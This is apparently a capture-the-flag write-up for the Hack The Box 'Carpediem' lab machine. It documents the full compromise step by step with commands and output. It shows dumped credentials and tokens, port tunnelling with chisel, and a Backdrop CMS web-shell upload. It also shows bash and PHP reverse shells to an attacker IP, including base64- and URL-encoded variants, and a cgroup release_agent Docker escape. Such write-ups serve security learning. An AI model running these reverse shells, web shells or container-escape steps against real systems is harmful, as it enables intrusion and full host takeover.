classes/Trudesk.php:7:    private $password = '';
classes/Trudesk.php-8-    private $database = '';
classes/Trudesk.php-9-
--
initialize.php-1-<?php
initialize.php:2:$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
initialize.php-3-if(!defined('base_url')) define('base_url','http://portal.carpediem.htb/');
initialize.php-4-if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
--
initialize.php-6-if(!defined('DB_SERVER')) define('DB_SERVER',"mysql");
initialize.php-7-if(!defined('DB_USERNAME')) define('DB_USERNAME',"portaldb");
initialize.php:8:if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"J5tnqsXpyzkK4XNt");
initialize.php-9-if(!defined('DB_NAME')) define('DB_NAME',"portal");
initialize.php-10-?>
--
admin/user/index.php-29-                                </div>
admin/user/index.php-30-                                <div class="form-group">
admin/user/index.php:31:                                        <label for="password">Password</label>
admin/user/index.php:32:                                        <input type="password" name="password" id="password" class="form-control" value="" autocomplete="off">
admin/user/index.php:33:                                        <small><i>Leave this blank if you dont want to change the password.</i></small>
admin/user/index.php-34-                                </div>
admin/user/index.php-35-                                <div class="form-group">
--
admin/login.php-26-        </div>
admin/login.php-27-        <div class="input-group mb-3">
admin/login.php:28:          <input type="password" class="form-control" name="password" placeholder="Password">
admin/login.php-29-          <div class="input-group-append">
admin/login.php-30-            <div class="input-group-text">
--
admin/login.php-47-
admin/login.php-48-      <!-- <p class="mb-1">
admin/login.php:49:        <a href="forgot-password.html">I forgot my password</a>
admin/login.php-50-      </p> -->
admin/login.php-51-
--
login.php-21-                </div>
login.php-22-                <div class="form-group">
login.php:23:                    <label for="" class="control-label">Password</label>
login.php:24:                    <input type="password" class="form-control form" name="password" required>
login.php-25-                </div>
login.php-26-                <div class="form-group d-flex justify-content-between">
--
edit_account.php-40-                            </div>
edit_account.php-41-                            <div class="form-group">
edit_account.php:42:                                <label for="password" class="control-label">New Password</label>
edit_account.php:43:                                <input type="password" name="password" class="form-control form" value="" placeholder="(Enter value to change password)">
edit_account.php-44-                            </div>
edit_account.php-45-                            <div class="form-group d-flex justify-content-end">
```

#### Trudesk Initial Findings

The api key and username in `classes/Trudesk.php` seem interesting:

```
$ cat classes/Trudesk.php
<?php
class TrudeskConnection{

    private $host = 'trudesk.carpediem.htb';
    private $apikey = 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4';
    private $username = 'svc-portal-tickets';
    private $password = '';
    private $database = '';

}
```

We have a new virtual host. Let's add it to `/etc/hosts`: `echo "10.10.11.167 trudesk.carpediem.htb" | sudo tee -a /etc/hosts`. We get a login page that displays that we have version `1.1.11`:

![](screenshots/Screenshot%202022-07-30%20at%2016-09-19%20Trudesk%20%C2%B7%20Login.png)

[Trudesk](https://github.com/polonel/trudesk) "is an open-source help desk/ticketing solution." Searching for "trudesk 1.1.11 exploit" finds [CVE-2022-2023](https://nvd.nist.gov/vuln/detail/CVE-2022-2023) and [the bug bounty report](https://huntr.dev/bounties/0f35b1d3-56e6-49e4-bc5a-830f52e094b3/). However, this exploit seems to require us to have a non-privileged login, which we do not.

We have an API key so we can try searching for tickets according to the [Trudesk API docs](https://docs.trudesk.io/v1/api/#Search):

```
$ curl -H "Content-Type: application/json" \
     -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" \
     -l http://trudesk.carpediem.htb/api/v1/tickets/search/\?search\=\{a\}
{"success":true,"error":null,"count":0,"totalCount":0,"tickets":[]}%
```

We also explore other elements of the Trudesk API but find nothing.

#### LinPEAS

Upload linPEAS and run with `./linpeas.sh -a 2>&1 | tee linpeas_report_docker.txt`. Download the report with `download linepeas_report.txt` in the local terminal. You can open [linpeas_report_docker.txt](./linpeas_report_docker.txt) with `less -R linpeas_report_docker.txt`.

There is some sensitive information in the environment variables:

```
╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
MYSQL_PORT_33060_TCP=tcp://172.17.0.4:33060
APACHE_CONFDIR=/etc/apache2
HOSTNAME=3c371615b7aa
PHP_INI_DIR=/usr/local/etc/php
SHLVL=2
OLDPWD=/var/www/html/portal
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.25
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
MYSQL_ENV_MYSQL_MAJOR=8.0
PHP_ASC_URL=https://www.php.net/distributions/php-7.4.25.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=./linpeas.sh
PHP_URL=https://www.php.net/distributions/php-7.4.25.tar.xz
TERM=tmux-256color
MYSQL_PORT_3306_TCP_ADDR=172.17.0.4
MYSQL_ENV_MYSQL_ROOT_PASSWORD=3dQXeqjMHnq4kqDv
HISTCONTROL=ignorespace
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MYSQL_ENV_GOSU_VERSION=1.12
MYSQL_PORT_3306_TCP_PORT=3306
APACHE_LOCK_DIR=/var/lock/apache2
MYSQL_PORT_3306_TCP_PROTO=tcp
LANG=C
HISTSIZE=0
MYSQL_PORT_33060_TCP_ADDR=172.17.0.4
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
MYSQL_PORT=tcp://172.17.0.4:3306
APACHE_LOG_DIR=/var/log/apache2
MYSQL_PORT_3306_TCP=tcp://172.17.0.4:3306
MYSQL_PORT_33060_TCP_PORT=33060
MYSQL_ENV_MYSQL_VERSION=8.0.27-1debian10
MYSQL_PORT_33060_TCP_PROTO=tcp
MYSQL_NAME=/portal/mysql
PWD=/tmp
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc         libc-dev                 make            pkg-config              re2c
PHP_SHA256=12a758f1d7fee544387a28d3cf73226f47e3a52fb3049f07fcc37d156d393c0a
APACHE_ENVVARS=/etc/apache2/envvars
HISTFILE=/dev/null
```

There is a MySQL server at `172.17.0.4:3306` with a root password of `3dQXeqjMHnq4kqDv`. From `/var/www/html/portal/initialize.php` we saw that the site was connecting to the address `mysql`, which Docker resolves automatically if that is the name of a container. We can resolve it ourselves with `getent hosts mysql`:

```
172.17.0.4      mysql a5004fe641ca
```

So, `mysql` is `172.17.0.4`. So, now we have two passwords to the database at `172.17.0.4:3306`.

Since we have limited tools in the docker container, we need to forward this port to our attacker machine so we can work with it. This is made easy with [chisel](https://github.com/jpillora/chisel) ([helpful guide](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)). Run `./chisel server -p 12350 --reverse` on your attacker machine and then run `./chisel client 10.10.14.98:12350 R:3306:172.17.0.4:3306` on the target. You can upload `chisel` easily with pwncat by running `upload tools/chisel` in the local shell of pwncat.

We can then run `sqlmap -d mysql://root:3dQXeqjMHnq4kqDv@localhost:3306/ --dbs` to dump the list of databases:

```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] portal
[*] sys
```

Sure enough, this is the same database we exploted with SQLi before. So, nothing new to see here.

Anyway, LinPEAS also finds some other devices on the network, which are probably other Docker containers:

```
╔══════════╣ Networks and neighbours
Iface        Destination     Gateway         Flags   RefCnt  Use     Metric  Mask            MTU     Window  IRTT                                                       
eth0    00000000        010011AC        0003    0       0       0       00000000        0       0       0                                                                               
eth0    000011AC        00000000        0001    0       0       0       0000FFFF        0       0       0                                                                               
IP address       HW type     Flags       HW address            Mask     Device
172.17.0.6       0x1         0x2         02:42:ac:11:00:06     *        eth0
172.17.0.3       0x1         0x2         02:42:ac:11:00:03     *        eth0
172.17.0.4       0x1         0x2         02:42:ac:11:00:04     *        eth0
172.17.0.1       0x1         0x2         02:42:1d:cc:7d:66     *        eth0
172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        eth0
```

#### Nmap

Let's use `nmap` to scan these machines. I uploaded [this standalone `nmap` binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) (it's an old version, but it should be fine) to the machine:

```
$ ./nmap -p- 172.17.0.0/24
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-07-30 21:07 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.17.0.2
Host is up (0.0010s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https

Nmap scan report for 172.17.0.3
Host is up (0.00098s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap scan report for mysql (172.17.0.4)
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for 3c371615b7aa (172.17.0.5)
Host is up (0.000052s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.17.0.6
Host is up (0.00011s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8118/tcp open  unknown

Nmap done: 256 IP addresses (6 hosts up) scanned in 23.33 seconds
```

Forwarding `172.17.0.6:8118` with `./chisel client 10.10.14.98:12350 R:8118:172.17.0.6:8118` reveals that `172.17.0.6:8118` is Trudesk. We check the other http services the same way. `172.17.0.1:80` is the countdown website we saw initially, which makes sense since `172.17.0.1` is the host. `172.17.0.2:80` shows the "Apache2 Ubuntu Default Page." `172.17.0.2:443` appears to be an instance of [Backdrop CMS](https://backdropcms.org/):

![](screenshots/Screenshot%202022-07-30%20at%2017-21-44%20Home%20backdrop%20carpediem%20htb.png)

Searching for "backdrop cms exploit" doesn't immediately find anything promising.

There is also FTP on `172.17.0.2`, which is interesting. Forwarding that port and attempt [anonymous login](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp#anonymous-login) doesn't work.

### MongoDB

Port `27017` is the default MongoDB port. We port forward `172.17.0.3:27017`. Then, just run the `mongo` command on the attacker machine and it will automatically connect to the correct database since it is on `localhost` now.

(Note: This part is very similar to the [Talkative machine](../Talkative/README.md). This machine and Talkative share an author.)

We can view the databases and switch to the `trudesk` database:

```
rs0:PRIMARY> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
trudesk  0.001GB
rs0:PRIMARY> use trudesk
switched to db trudesk
rs0:PRIMARY> db
trudesk
```

We can view the collections in this database with `show collections`:

```
accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes
```

Let's view the `accounts` collection:

```json
> db.accounts.find().pretty()
{
        "_id" : ObjectId("623c8b20855cc5001a8ba13c"),
        "preferences" : {
                "tourCompleted" : false,
                "autoRefreshTicketGrid" : true,
                "openChatWindows" : [ ]
        },
        "hasL2Auth" : false,
        "deleted" : false,
        "username" : "admin",
        "password" : "$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS",
        "fullname" : "Robert Frost",
        "email" : "rfrost@carpediem.htb",
        "role" : ObjectId("623c8b20855cc5001a8ba138"),
        "title" : "Sr. Network Engineer",
        "accessToken" : "22e56ec0b94db029b07365d520213ef6f5d3d2d9",
        "__v" : 0,
        "lastOnline" : ISODate("2022-04-07T20:30:32.198Z")
}
{
        "_id" : ObjectId("6243c0be1e0d4d001b0740d4"),
        "preferences" : {
                "tourCompleted" : false,
                "autoRefreshTicketGrid" : true,
                "openChatWindows" : [ ]
        },
        "hasL2Auth" : false,
        "deleted" : false,
        "username" : "jhammond",
        "email" : "jhammond@carpediem.htb",
        "password" : "$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq",
        "fullname" : "Jeremy Hammond",
        "title" : "Sr. Systems Engineer",
        "role" : ObjectId("623c8b20855cc5001a8ba139"),
        "accessToken" : "a0833d9a06187dfd00d553bd235dfe83e957fd98",
        "__v" : 0,
        "lastOnline" : ISODate("2022-04-01T23:36:55.940Z")
}
{
        "_id" : ObjectId("6243c28f1e0d4d001b0740d6"),
        "preferences" : {
                "tourCompleted" : false,
                "autoRefreshTicketGrid" : true,
                "openChatWindows" : [ ]
        },
        "hasL2Auth" : false,
        "deleted" : false,
        "username" : "jpardella",
        "email" : "jpardella@carpediem.htb",
        "password" : "$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK",
        "fullname" : "Joey Pardella",
        "title" : "Desktop Support",
        "role" : ObjectId("623c8b20855cc5001a8ba139"),
        "accessToken" : "7c0335559073138d82b64ed7b6c3efae427ece85",
        "__v" : 0,
        "lastOnline" : ISODate("2022-04-07T20:33:20.918Z")
}
{
        "_id" : ObjectId("6243c3471e0d4d001b0740d7"),
        "preferences" : {
                "tourCompleted" : false,
                "autoRefreshTicketGrid" : true,
                "openChatWindows" : [ ]
        },
        "hasL2Auth" : false,
        "deleted" : false,
        "username" : "acooke",
        "email" : "acooke@carpediem.htb",
        "password" : "$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.",
        "fullname" : "Adeanna Cooke",
        "title" : "Director - Human Resources",
        "role" : ObjectId("623c8b20855cc5001a8ba139"),
        "accessToken" : "9c7ace307a78322f1c09d62aae3815528c3b7547",
        "__v" : 0,
        "lastOnline" : ISODate("2022-03-30T14:21:15.212Z")
}
{
        "_id" : ObjectId("6243c69d1acd1559cdb4019b"),
        "preferences" : {
                "tourCompleted" : false,
                "autoRefreshTicketGrid" : true,
                "openChatWindows" : [ ]
        },
        "hasL2Auth" : false,
        "deleted" : false,
        "username" : "svc-portal-tickets",
        "email" : "tickets@carpediem.htb",
        "password" : "$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW",
        "fullname" : "Portal Tickets",
        "title" : "",
        "role" : ObjectId("623c8b20855cc5001a8ba13a"),
        "accessToken" : "f8691bd2d8d613ec89337b5cd5a98554f8fffcc4",
        "__v" : 0,
        "lastOnline" : ISODate("2022-03-30T13:50:02.824Z")
}
```

### Trudesk to Zoiper

We now have some additional `accessToken`s that might be able to read some tickets via the Trudesk API (before we just had `svc-portal-tickets`'s API key). I used `Robert Frost`'s key like so:

```
curl -H "Content-Type: application/json" \
     -H "accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9" \
     -l http://trudesk.carpediem.htb/api/v1/tickets/search/\?search\=\{a\}
```

The output is available in [trudesk_api_ticket_search.json](trudesk_api_ticket_search.json). We could have changed a user's password like we did in the [Talkative machine writeup](../Talkative/README.md), but that would require us to fiure out how passwords are hashed.

We find this conversation:

```
<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>

<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>

<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>

<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>
```

[Zoiper](https://www.zoiper.com/) is a "free softphone to make VoIP calls through your PBX or favorite SIP provider." We can download the software by going to [the download page](https://www.zoiper.com/en/voip-softphone/download/current), clicking "Linux," clicking "Free," and finally clicking "Debian package." Install it with `sudo dpkg -i ~/Downloads/Zoiper5_5.5.13_x86_64.deb`. Run it with `zoiper5`:

![](screenshots/Screenshot-20220730180039-1680x1160.png)

Click "Contine as Free User." Then sign in using the credentials we leaked from Trudesk, `9650:2022`:

![](screenshots/Screenshot-20220730180603-1676x1156.png)

Use the IP address `10.10.11.167` (I tried `carpediem.htb` but that wouldn't work):

![](screenshots/Screenshot-20220730192810-1688x1160.png)

Zoiper will now test some configurations:

![](screenshots/Screenshot-20220730192936-1680x1166.png)

Finally, we can dial `*62` to check the voicemail:

![](screenshots/Screenshot-20220730193040-484x1158.png)

We are asked for a password. Just use `2022` from before. Press 1 for the new message. The message gives a welcome to Horace by Robert and lists a password character by character: `AuRj4pxq9qPk`.

The title of the ticket in Trudesk is "New employee on-boarding - Horace Flaccus" and usernames appear to be formatted as first initial last name (ex: `Joey Pardella` is `jpardella`) so the username is probably `hflaccus`.

Running `ssh hflaccus@carpediem.htb` and using the password we just got is successful! We can now `cat ~/user.txt` to get the `user.txt` flag.

## Lateral Movment

### Information Gathering (Lateral Movement)

We connect via pwncat instead to make uploading files easier: `pwncat-cs hflaccus@carpediem.htb`. Then, we run LinPEAS with `./linpeas.sh -a 2>&1 | tee linpeas_report_hflaccus.txt`. Download the report with `download linepeas_report.txt` in the local terminal. You can open [linpeas_report_hflaccus.txt](./linpeas_report_hflaccus.txt) with `less -R linpeas_report_hflaccus.txt`.

There are several other users with a console:

```
╔══════════╣ Users with console
hflaccus:x:1000:1000:Quintus Horatius Flaccus:/home/hflaccus:/bin/bash
jhammond:x:1003:1003:Jeremy Hammond:/home/jhammond:/bin/bash
jpardella:x:1004:1004:Joey Pardella:/home/jpardella:/bin/bash
rfrost:x:1002:1002:Robert Frost:/home/rfrost:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

We actually get a red bold with yellow highlight item from LinPEAS (which means that it is most definitly an attack vector) on `/usr/sbin/tcpdump`:

```
Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example), these are the "capabilities needed by tcpdump to allow any user to sniff packets."

### Wireshark

So, we are going to sniff the packets on the docker container network `docker0` (list network interfaces with `ip a`) and save them to a packet capture file: `tcpdump -i docker0 -w hflaccus_carpediem_docker0.pcap`. I let this run for just over a minute. We are told that `188 packets received by filter`. We download the file: [hflaccus_carpediem_docker0.pcap](hflaccus_carpediem_docker0.pcap). Next, we open it for analysis in Wireshark

In LinPEAS we see the below output:

```
══╣ Possible private SSH keys were found!
/etc/ssl/certs/backdrop.carpediem.htb.key
```

That is the SSL certificate for `backdrop.carpediem.htb`, the one CMS site we saw earlier. We download the key: [backdrop.carpediem.htb.key](./backdrop.carpediem.htb.key). Now, in Wireshark go to Edit > Preferences > Protocols > TLS > RSA keys list. Add the key to the list (don't worry about ip and other columns). Side note: I did this before in the [WebNet0 challenge from PicoCTF 2019](https://picoctf2019.haydenhousen.com/forensics/webnet0).

![](screenshots/Screenshot-20220730214203-3292x1630.png)

We see a POST request to `/?q=user/login` on `backdrop.carpediem.htb`. We right click > Follow > HTTP Stream and we see the following:

```
POST /?q=user/login HTTP/1.1
Host: backdrop.carpediem.htb:8002
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Origin: https://backdrop.carpediem.htb:8002
Content-Type: application/x-www-form-urlencoded
Referer: https://backdrop.carpediem.htb:8002/?q=user/login
Accept-Language: en-US,en;q=0.9
Content-Length: 128

name=jpardella&pass=tGPN6AmJDZwYWdhY&form_build_id=form-rXfWvmvOz0ihcfyBBwhTF3TzC8jkPBx4LvUBrdAIsU8&form_id=user_login&op=Log+inHTTP/1.1 302 Found
Date: Sat, 30 Jul 2022 23:56:02 GMT
Server: Apache/2.4.48 (Ubuntu)
Expires: Fri, 16 Jan 2015 07:50:00 GMT
Last-Modified: Sat, 30 Jul 2022 23:56:02 +0000
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
ETag: "1659225362"
Set-Cookie: SSESS0651e6855a1f90fa8155e44165bd9f99=9ovF3cNaTA3RBfz48wAEZTo2A5V2YYKpe7X51LWXZME; expires=Tue, 23-Aug-2022 03:29:22 GMT; Max-Age=2000000; path=/; domain=.backdrop.carpediem.htb; secure; HttpOnly
Location: https://backdrop.carpediem.htb:8002/?q=admin/dashboard
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

### `backdrop.carpediem.htb`

There we go! Now we have credentials for `backdrop.carpediem.htb`: `jpardella:tGPN6AmJDZwYWdhY`. We can forward the port back to our attacker machine by running `./chisel server -p 12350 --reverse` on the attacker machine and then running `./chisel client 10.10.14.98:12350 R:443:172.17.0.2:443` on the target. Then, we can go to `https://localhost/` and sign in:

![](screenshots/Screenshot%202022-07-30%20at%2022-09-07%20Dashboard%20backdrop%20carpediem%20htb.png)

Navigating to "Reports" and then ["Status report"](https://localhost/?q=admin/reports/status) tells us the Backdrop CMS version is `1.21.4`.

![](screenshots/Screenshot%202022-07-30%20at%2022-13-21%20Status%20report%20backdrop%20carpediem%20htb.png)

Searching for "backdrop cms 1.21.4 exploit" finds [this page](https://curatedphp.com/r/backdrop-is-a-backdropbackdrop/index.html), wihch has patch notes for version `1.21.4` released on Mar 16, 2022 and states "Security release for Backdrop CMS. This release includes several bug fixes, and fixes 1 security vulnerability." It links to [SA-BACKDROP-CORE-2022-003](https://backdropcms.org/security/backdrop-sa-core-2022-003), which states "If a Backdrop site is configured to use CKEditor for rich-text editing, an attacker that can create or edit content (even without access to CKEditor themselves) may be able to exploit one or more Cross-Site Scripting (XSS) vulnerabilities. Victims may be people who later edit that content using CKEditor, including site admins with privileged access." So, this exploit is unlikely to be useful to us since it was patched in the version we have and it doesn't get code execution.

Searching for "backdrop rce" finds [V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS), which states "The Backdrop CMS version 1.20 allows plugins to be added via ZIP files uploaded to the site. And because it does not have anti-CSRF protection, it is possible for an attacker to create a plugin with a file that allows execution of commands, host it and, using a forged page, make the site admin upload this plugin just by clicking on a malicious link." This is exactly what we want.

We download [reference.tar](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar) (linked to from [V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS), also available [here](reference.tar)). We upload the `reference.tar` file to the [manual module installation page](https://localhost/?q=admin/installer/manual):

![](screenshots/Screenshot%202022-07-30%20at%2022-21-30%20Manual%20installation%20backdrop%20carpediem%20htb.png)

Then click "INSTALL":

![](screenshots/Screenshot%202022-07-30%20at%2022-21-07%20Update%20manager%20backdrop%20carpediem%20htb.png)

Now, according to the [GitHub repo](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS), we go to `https://localhost/modules/reference/shell.php?cmd=ls` and sure enough we have command execution: `LICENSE.txt README.md reference.info reference.install reference.module shell.php tests views`.

Now, let's get a reverse shell. Our reverse shell will be a standard `bash` reverse shell: `bash -i >& /dev/tcp/10.10.14.98/51894 0>&1`. Let's encode that in base64 by running `echo -n "bash -i >& /dev/tcp/10.10.14.98/51894 0>&1" | base64`, which gives us `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC81MTg5NCAwPiYx`. So, our payload should be `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC81MTg5NCAwPiYx | base64 -d | bash`. Let's url encode that to `echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC45OC81MTg5NCAwPiYx%20%7C%20base64%20-d%20%7C%20bash`. Start a listener with `pwncat-cs -lp 51894` and then run the reverse shell by going to `https://localhost/modules/reference/shell.php?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC45OC81MTg5NCAwPiYx%20%7C%20base64%20-d%20%7C%20bash`. Sure enough, we get a shell!

## Docker Escape

We are in another Docker container as user `www-data`. So, let's upload [CDK](https://github.com/cdk-team/CDK#installationdelivery) and run a full scan with `./cdk_linux_amd64 eva --full`. This doesn't find anything useful. Next, we run [pspy](https://github.com/DominicBreuker/pspy) to look for processes that are ran frequently:

```
2022/07/30 20:38:17 CMD: UID=0    PID=4286   | /bin/bash /opt/heartbeat.sh
2022/07/30 20:38:46 CMD: UID=0    PID=4287   | /bin/bash /opt/heartbeat.sh
2022/07/30 20:38:46 CMD: UID=0    PID=4288   | /bin/bash /opt/heartbeat.sh
2022/07/30 20:38:47 CMD: UID=0    PID=4289   | php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost
2022/07/30 20:38:47 CMD: UID=0    PID=4290   | /bin/bash /opt/heartbeat.sh
2022/07/30 20:38:47 CMD: UID=0    PID=4291   | cp /root/index.php /var/www/html/backdrop/index.php
```

Let's look at the `/opt/heartbeat.sh` script:

```
$ cat /opt/heartbeat.sh
#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
        exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
        #something went wrong.  restoring from backup.
        cp /root/index.php /var/www/html/backdrop/index.php
fi
```

So, we cannot edit `/var/www/html/backdrop/core/scripts/backdrop.sh` because if the MD5 hash doesn't match then the script won't run. However, looking at the `backdrop.sh` script we notice that its final parameter has this description:

```
The URI to execute, i.e. http://default/foo/bar for executing
the path '/foo/bar' in your site 'default'. URI has to be
enclosed by quotation marks if there are ampersands in it
(f.e. index.php?q=node&foo=bar). Prefix 'http://' is required,
and the domain must exist in Backdrop's sites-directory.

If the given path and file exists it will be executed directly,
i.e. if URI is set to http://default/bar/foo.php
and bar/foo.php exists, this script will be executed without
bootstrapping Backdrop. To execute Backdrop's cron.php, specify
http://default/core/cron.php as the URI.
```

The URI passed to the `backdrop.sh` script from the `heartbeat.sh` script is `https://localhost`. So, if we replace `index.php` with a php reverse shell we will get a shell as root on the container.

Start a reverse shell with `pwncat-cs -lp 30076`. Then run `echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.98/30076 0>&1'\");?>" > /var/www/html/backdrop/index.php`. This creates a revere shell as root on the container!

Right now we have chisel running as the `hflaccus` user to forward the Backdrop CMS interface to our attacker machine. On top of that, we have a reverse shell to `www-data` on the Backdrop CMS Docker container. And on top of that, we have a reverse shell to `root` on the container via a script that is run on a schedule.

Reupload CDK onto the box as root now. Running it with `./cdk_linux_amd64 eva --full` finds: `Cap decode: 0x00000000a00425fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_AUDIT_WRITE,CAP_SETFCAP`.

We can exploit this container and get root on the host machine thanks to [CVE-2022-0492](https://nvd.nist.gov/vuln/detail/CVE-2022-0492). **[This article](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)** is a fantastic description of the issue. HackTricks has a brief discussion on [linux capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities) and the Trail of Bits Blog [discusses the exploit at a higher level](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).

First, we run these commands within the container (paste them all at once, do not run one-by-one):

```bash
unshare -UrmC bash
umount /tmp/dog2
rm -R /tmp/dog2
mkdir /tmp/dog2
mount -t cgroup -o rdma cgroup /tmp/dog2
mkdir /tmp/dog2/x
echo 1 > /tmp/dog2/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/dog2/release_agent
echo '#!/bin/bash' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.98/51895 0>&1'" >> /cmd
chmod a+x /cmd
bash -c "echo \$\$ > /tmp/dog2/x/cgroup.procs"
```

Then, on our SSH connection as the `hflaccus` user, we simply execute `bash -p` and get a root shell. Note: This only worked once I exited from the container reverse shell. Finally, run `cat /root/root.txt` to get the `root.txt` flag.

After rooting the machine, we find the voicemail we heard as a file in `/root`: [voicemail.wav](voicemail.wav).
